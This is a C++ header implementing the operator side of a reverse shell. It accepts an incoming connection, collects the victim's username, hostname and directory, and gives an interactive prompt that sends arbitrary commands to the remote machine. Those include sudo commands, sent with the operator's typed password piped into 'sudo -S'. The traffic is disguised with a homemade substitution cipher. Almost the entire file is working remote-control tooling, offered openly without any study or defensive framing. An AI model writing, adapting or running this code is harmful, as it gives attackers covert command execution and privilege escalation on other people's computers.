#ifndef MAINSH
#define MAINSH
// reverse shell header file using IPV4 
// binds socket and listens for incoming connection

#include <iostream>
#include <string>
#include <thread>
#include <sys/time.h>
#include <cstring>
#include <vector>
#include <ctime>
#include <map>

//NETWORKING
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <limits.h>
#include <arpa/inet.h>
#include <netdb.h>

struct mainsh{
    std::vector<std::string> logs; // stores all the previous commands and exact time

    char client_name[30];
    char client_hostname[30];
    char dir[30];

    int bytes_red = 0;
    int bytes_written = 0;

    int* serverptr;

    int global_socket;

    bool ispw = false; // used to mask password in logs
    std::string maskedpw; // masked password to store in logs

    std::string alphabet = "abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    std::string str = "gjewklmzusnvqpycthrifxbdao DWKISFOGNUQZXBYCEVRLMAHPJT6547812390";

    // this encryption method is designed to provide a basic layer of security against packet sniffing
    // without encryption everyone could see the data sent (which includes password)
    std::string ncrypt(std::string target){
        std::string encrypted;
        std::map <char, char> nmap;
        int pos = 0;

        for(char c : alphabet){
            nmap[c] = str.at(pos);
            pos++;
            
        }
        const char* quote = "'";
        for(char l : target){
            if((int) nmap[l] == 0 && l != *quote){encrypted.push_back(l);}

            else{encrypted.push_back(nmap[l]);}
            
        }
        return encrypted;

    }

    std::string dcrypt(std::string target){
        std::string decrypted;
        std::map <char, char> nmap;
        int pos = 0;

        for(char c : str){
            nmap[c] = alphabet.at(pos);
            pos++;
            
        }

        const char* quote = "'";
        for(char l : target){
            
            if((int)l == 0){decrypted.push_back(*quote);}

            else if((int) nmap[l] == 0){decrypted.push_back(l);}
            
            else{decrypted.push_back(nmap[l]);} 
        }

        return decrypted;
    
    }

    void tempsleep(){
        std::chrono::seconds duration(10);
        std::this_thread::sleep_for(duration);
    }

    void view_logs(){
        for(unsigned int p = 0; p < logs.size(); p++){
            std::cout << logs[p] << std::endl;
        }
    }

    void disconnect(){
        char disconnect[strlen("disconnect")+1];
        std::string ndisc = ncrypt("disconnect");
        strcpy(disconnect, ndisc.c_str());

        bytes_written += send(global_socket, (char*)&disconnect, strlen(disconnect), 0);
        close(global_socket);
        close(*(serverptr));

        std::cout << "[+] Bytes written: " << bytes_written << std::endl;
        std::cout << "[+] Bytes red: " << bytes_red << std::endl;

        std::cout << "";

        exit(1);
    }

    void send_bytes(std::string buffer){
        char temp[buffer.length()+1];
        strcpy(temp, ncrypt(buffer).c_str());
        // current date/time based on current system
        time_t now = time(0);
   
        // convert now to string form
        char* dt = ctime(&now);
        bytes_written += send(global_socket, (char*)&temp, strlen(temp), 0);
        std::string timer = "["+std::string(dt).substr(0, strlen(dt)-1)+"] ";
        if(ispw){
            logs.push_back(timer + dcrypt(maskedpw));
            ispw = false;
        }
        else{logs.push_back(timer + dcrypt(temp));}
        
    }

    // creates socket and return pointer
    int* create_socket(unsigned int PORT){
        
        char hostname[HOST_NAME_MAX];
        gethostname(hostname, HOST_NAME_MAX);

        sockaddr_in serv_addr;
        bzero((char*)&serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET; // IPV4
        serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); // socket accepts connections to all the IPs of the machine
        serv_addr.sin_port = htons(PORT); 

        int server_sd = socket(AF_INET, SOCK_STREAM, 0);
        serverptr = &server_sd;
        if(server_sd < 0){
            fprintf(stderr, "[-] failed to open socket: %s\n", strerror(errno));
            tempsleep();
        }

        int bind_socket = bind(server_sd, (struct sockaddr*) &serv_addr, sizeof(serv_addr)); //binding socket
        if(bind_socket < 0){
            fprintf(stderr, "[-] failed to bind socket: %s\n", strerror(errno));
            tempsleep();
        }
        
        std::cout << "[+] binding socket as " << hostname << " on port " << PORT << std::endl;
        listen(server_sd, 5); //second argument is backlog queue

        sockaddr_in new_sock_addr;
        socklen_t new_sock_addr_size = sizeof(new_sock_addr);

        int new_server_sd = accept(server_sd, (sockaddr *)&new_sock_addr, &new_sock_addr_size);
        int* ptr_serversd = &new_server_sd;
        global_socket = new_server_sd;
        if(new_server_sd < 0){
            fprintf(stderr, "[-] failed to accept request from client: %s\n", strerror(errno));
            tempsleep();
        }
        std::cout << "[?] socket created at " << ptr_serversd << std::endl;
        struct timeval start1, end1;
        gettimeofday(&start1, NULL);

        memset(client_name, '\0', sizeof(client_name));
        memset(client_hostname, '\0', sizeof(client_hostname));

        char temp_name[30];
        char temp_hostname[30];
        char temp_dir[30];

        bytes_red += recv(new_server_sd, (char*)&temp_name, sizeof(temp_name), 0); // account
        bytes_red += recv(new_server_sd, (char*)&temp_hostname, sizeof(temp_hostname), 0); // hostname
        bytes_red += recv(new_server_sd, (char*)&temp_dir, sizeof(temp_dir), 0); // directory
        //dcrypt buffers
        strcpy(client_name, dcrypt(temp_name).c_str());
        strcpy(client_hostname, dcrypt(temp_hostname).c_str());
        strcpy(dir, dcrypt(temp_dir).c_str());

        std::cout << "[+] received connection from " <<  std::string(client_hostname).substr(0, strlen(client_hostname)-1) << std::endl;
        
        struct hostent *getipv4; //gethostbyname returns a pointer of type hostent
        getipv4 = gethostbyname((std::string(client_hostname).substr(0, strlen(client_hostname)-1)).c_str() );
        printf("[?] client addr: %s\n", inet_ntoa(*(struct in_addr*)getipv4->h_addr));

        return ptr_serversd;
    }

    void createsh(){
        char buffer[1500];

        std::string cmd;
        std::string str_dir = std::string(dir).substr(0, strlen(dir)-1);
        std::string str_name = std::string(client_name).substr(0, strlen(client_name)-1);
        std::string str_hostname = std::string(client_hostname).substr(0, strlen(client_hostname)-1);
        // do something about write-protected directory (IMPORTANT)

        while(true){
            std::cout << str_name << "@" << str_hostname << ":" << str_dir << "$ ";
            std::getline(std::cin, cmd);

            std::string arg = cmd.substr(0, cmd.find(" "));

            if(cmd == "disconnect"){ disconnect();} // close connection
            else if(cmd == "logs"){view_logs();}
            else if(cmd == "clear" || cmd == "cls"){system("clear");}
            else if(cmd.length() == 0){continue;}

            else if(arg == "sudo"){
                std::string su_cmd = cmd.substr(5, cmd.length()); // super user command
                
                /*
                std::cout << "[sudo] password for " << str_name << ": ";

                std::getline(std::cin, pw);
                */
                std::string str = "[sudo] password for " + std::string(str_name) + ": ";
                char* pw = getpass(str.c_str());

                memset(&buffer, 0x00, sizeof(buffer));
                
                std::string sudo_command = ("echo ") + std::string(pw) + (" | sudo -S -k ") +  cmd;
                ispw = true;
                maskedpw = ("echo ***** | sudo -S -k " +  cmd);

                send_bytes(sudo_command);

                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);
                std::cout << dcrypt(std::string(buffer)) << std::endl;

            }

            else if(arg == "cd"){
                std::string next_dir = cmd.substr(3, cmd.length());
                send_bytes("dir " + next_dir);

                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);
                std::cout << std::string(buffer).substr(0, strlen(buffer)-1) << std::endl;
                std::string err = "dir: cannot access '"+next_dir+"': No such file or directory";

                if(std::string(buffer).substr(0, strlen(buffer)-1) != err){
                    str_dir = next_dir;
                }
                memset(&buffer, 0x00, sizeof(buffer));
            }

            else{
                std::string ncmd = ("cd " + str_dir + " && " + cmd);
                send_bytes(ncmd);
                
                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);
                std::string tempbuff = std::string(buffer).substr(0, strlen(buffer)-1);
                std::cout << dcrypt(tempbuff) << std::endl;
                memset(&buffer, 0x00, sizeof(buffer));
            }
        }
    
        
    }



};


#endif
